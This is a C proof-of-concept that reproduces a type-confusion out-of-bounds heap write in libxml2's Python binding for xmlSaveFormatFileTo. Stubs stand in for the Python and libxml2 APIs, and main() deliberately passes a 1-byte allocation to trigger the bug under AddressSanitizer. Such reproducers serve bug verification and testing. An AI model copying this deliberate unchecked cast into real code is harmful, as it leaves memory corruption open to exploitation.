#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <stdint.h>

/* Minimal stand-ins for Python/libxml2 types used by the vulnerable binding */
typedef struct PyObject PyObject;
struct PyObject { char tiny; };

typedef void *xmlOutputBufferPtr;
typedef void *xmlDocPtr;

typedef struct {
    void *obj; /* what the binding assumes is at offset 0 */
} PyoutputBuffer_Object;

/* A fake "tuple" container to pass arguments through our stub PyArg_ParseTuple */
typedef struct {
    PyObject *a;         /* pyobj_buf */
    PyObject *b;         /* pyobj_cur */
    char *encoding;      /* encoding */
    int format;          /* format */
} FakeTuple;

/* Stub: emulate Python's PyArg_ParseTuple for the exact call pattern used */
int PyArg_ParseTuple(PyObject *args, const char *fmt, ...) {
    (void)fmt; /* format string is ignored in this stub */
    va_list ap;
    va_start(ap, fmt);
    PyObject **pyobj_buf = va_arg(ap, PyObject **);
    PyObject **pyobj_cur = va_arg(ap, PyObject **);
    char **encoding      = va_arg(ap, char **);
    int *format          = va_arg(ap, int *);
    va_end(ap);

    FakeTuple *t = (FakeTuple *)args;
    if (!t) return 0;
    *pyobj_buf = t->a;
    *pyobj_cur = t->b;
    *encoding  = t->encoding;
    *format    = t->format;
    return 1; /* success */
}

/* Stub: return some heap buffer to act as the xmlOutputBufferPtr */
xmlOutputBufferPtr PyoutputBuffer_Get(PyObject *obj) {
    (void)obj;
    /* allocate a fake output buffer the callee will free */
    void *p = malloc(32);
    memset(p, 0xCD, 32);
    return p;
}

/* Stub: not used downstream for the bug */
xmlDocPtr PyxmlNode_Get(PyObject *obj) {
    (void)obj;
    return NULL;
}

/* Stub: emulate libxml2 API that frees the output buffer */
int xmlSaveFormatFileTo(xmlOutputBufferPtr buf, xmlDocPtr cur, char *encoding, int format) {
    (void)cur; (void)encoding; (void)format;
    /* The comment in the vulnerable code says this frees buf */
    free(buf);
    return 0;
}

/* Stub: wraps an int into a PyObject* (not actually used further) */
PyObject *libxml_intWrap(int v) {
    (void)v;
    PyObject *o = (PyObject *)malloc(16);
    memset(o, 0xAB, 16);
    return o;
}

/* Vulnerable wrapper function mirroring python/libxml.c::libxml_xmlSaveFormatFileTo */
PyObject *libxml_xmlSaveFormatFileTo(PyObject *self, PyObject *args) {
    (void)self;
    PyObject *py_retval;
    int c_retval;
    xmlOutputBufferPtr buf;
    PyObject *pyobj_buf;
    xmlDocPtr cur;
    PyObject *pyobj_cur;
    char *encoding;
    int format;

    if (!PyArg_ParseTuple(args, "OOzi:xmlSaveFormatFileTo", &pyobj_buf, &pyobj_cur, &encoding, &format))
        return NULL;
    buf = (xmlOutputBufferPtr) PyoutputBuffer_Get(pyobj_buf);
    cur = (xmlDocPtr) PyxmlNode_Get(pyobj_cur);

    c_retval = xmlSaveFormatFileTo(buf, cur, encoding, format);
    /* Vulnerable write: blindly treats pyobj_buf as PyoutputBuffer_Object and writes to it */
    ((PyoutputBuffer_Object *)(pyobj_buf))->obj = NULL; /* OOB write if pyobj_buf is not that type */

    py_retval = libxml_intWrap((int) c_retval);
    return py_retval;
}

int main(void) {
    /* Craft a tiny heap allocation that is NOT an output buffer object */
    void *small = malloc(1);          /* only 1 byte allocated */
    memset(small, 0x41, 1);

    /* Any other placeholder object for the document arg */
    void *other = malloc(16);
    memset(other, 0x42, 16);

    FakeTuple t;
    t.a = (PyObject *)small; /* pyobj_buf: intentionally not an output buffer object */
    t.b = (PyObject *)other; /* pyobj_cur */
    t.encoding = (char *)"UTF-8";
    t.format = 1;

    /* Call the vulnerable wrapper: this should trigger an OOB write via the cast+store */
    PyObject *ret = libxml_xmlSaveFormatFileTo(NULL, (PyObject *)&t);

    /* If we reach here without ASan abort, print something to avoid optimization */
    printf("Returned object: %p\n", (void *)ret);
    return 0;
}
